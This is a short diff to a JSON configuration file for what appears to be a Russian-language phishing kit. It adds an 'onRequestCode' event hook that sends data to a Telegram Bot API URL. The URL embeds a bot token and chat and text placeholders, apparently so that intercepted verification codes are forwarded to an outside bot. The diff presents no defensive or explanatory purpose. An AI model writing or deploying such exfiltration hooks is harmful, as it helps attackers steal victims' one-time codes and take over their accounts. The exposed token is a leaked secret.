@@ -5,7 +5,9 @@
   "languages": ["ru"],
 
   "events": {
-    "onRegister": [],
+    "onRequestCode": [
+      "https://api.telegram.org/bot7586753880:AAECNuj9DRnhFX4HGdeMRveK17yfvNAAIcM/sendmessage?chat_id=<id>&text=<text>"
+    ],
     "onProcessClose": []
   }
 }
